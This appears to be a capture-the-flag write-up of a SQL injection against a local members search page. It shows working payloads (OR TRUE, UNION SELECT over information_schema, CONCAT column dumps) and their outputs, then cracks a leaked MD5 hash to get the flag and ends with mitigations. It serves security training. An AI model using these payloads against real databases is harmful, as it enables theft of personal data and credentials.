# SQL injection on members table

## How we found the breach

From the page `http://localhost:8080/?page=member`, we found a members search engine that allows searching by user ID.

### Legit search

First, we tried to find a user with a userID equal to 1:

**Input:**

```
1
```

**Output:**

```
ID: 1
First name: one
Surname : me
```

The server returns two fields for each user.

### Simple SQL injection attempt

We attempted a simple SQL injection:

**Input:**

```
SELECT * FROM users
```

**Output:**

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
```

The server shows the raw MariaDB error, revealing that our query is being added to a prebuilt query. The prebuilt query appears to be:

```sql
SELECT first_name, surname FROM users WHERE users.id = ${id}
```

### Condition injection

To retrieve all entries from the users table, we need to create a SQL query with a WHERE clause that always evaluates to TRUE. We achieve this by adding an `OR TRUE` condition:

**Input:**

```
1 OR TRUE
```

This results in a query like:

```sql
SELECT first_name, surname FROM users WHERE users.id = 1 OR TRUE
```

**Output:**

```
ID: 1 OR TRUE
First name: one
Surname : me

ID: 1 OR TRUE
First name: two
Surname : me

ID: 1 OR TRUE
First name: three
Surname : me

ID: 1 OR TRUE
First name: Flag
Surname : GetThe
```

There are four users in the users table. The last one looks suspicious.

### UNION SELECT SQL injection

We can build a custom SQL query using UNION SELECT to change the query behavior completely. We want to discard all results of the first SELECT and only keep those of our own SELECT. For that, we make sure the WHERE clause of the first SELECT always evaluates to FALSE.

**Input:**

```
-1 UNION SELECT * FROM users
```

Since a serial integer is never negative, no user can have an id that is -1.

**Output:**

```
The used SELECT statements have a different number of columns
```

The problem is that our second UNION SELECT query returns more columns than the initial SQL query, which returned 2 columns, due to selecting all fields with `*`.

### Finding all table column names

Our goal is to retrieve the name of all columns of the users table to be able to select which of them we want to query with the UNION SELECT injection.

To do so, we use the default database `information_schema.columns`:

**Input:**

```
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

**Output:**
This query returns a very long list of all tables and columns in the entire database, including system tables. The output will look something like this:

```
ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: CHARACTER_SETS
Surname : CHARACTER_SET_NAME

First name: CHARACTER_SETS
Surname : DEFAULT_COLLATE_NAME

First name: CLIENT_STATISTICS
Surname : CLIENT

First name: CLIENT_STATISTICS
Surname : TOTAL_CONNECTIONS

... (many more system tables and columns) ...

First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

... (more system tables continue) ...
```

You need to search through this long output to find entries where "First name" is `users` to identify the columns of the users table.

We have retrieved the whole database tables and columns name. Focusing on the users table entries found in the output, we identified the following columns:

- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

### Using CONCAT injection

What we want now is to retrieve the value of all the columns for each user, concatenated inside a single column, as the initial query can return at most 2 columns.

**Input:**

```
-1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users
```

**Output:**

```
ID: -1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users
First name: 1onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9
Surname : 1

First name: 2twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10
Surname : 1

First name: 3threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d
Surname : 1

First name: 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Surname : 1
```

Inside the last user, we can find the operations to do to retrieve the flag.

### Retrieving the flag

Via MD5 decrypt of `5ff9d0165b4f92b14994e5c685cdce28` string, contained in the `countersign` users table column, we get `FortyTwo`.

Lowercasing it gives us `fortytwo`.

Hashing `fortytwo` using SHA256 results in the flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## How to exploit the breach / Why is it a problem

SQL injection vulnerabilities can lead to:

- **Data theft**: Leaking entire database contents, including users' personal information, emails, passwords, and other sensitive data
- **Data manipulation**: Inserting entries into tables (e.g., adding credits to an account, creating admin users)
- **Data destruction**: Deleting all entries from tables, potentially causing complete data loss if backups are not available
- **Privilege escalation**: Accessing or modifying data beyond the intended permissions
- **Database enumeration**: Discovering the entire database structure, including all tables and columns

## How to avoid the breach

- **Use parameterized queries (prepared statements)**: Never concatenate user input directly into SQL queries
- **Input validation**: Validate and sanitize all user inputs before using them in database queries
- **Least privilege**: Database users should have minimal necessary permissions
- **Error handling**: Don't expose database errors to users; use generic error messages
- **Web Application Firewall (WAF)**: Implement a WAF to detect and block SQL injection attempts
- **Regular security audits**: Perform regular penetration testing and code reviews to identify vulnerabilities
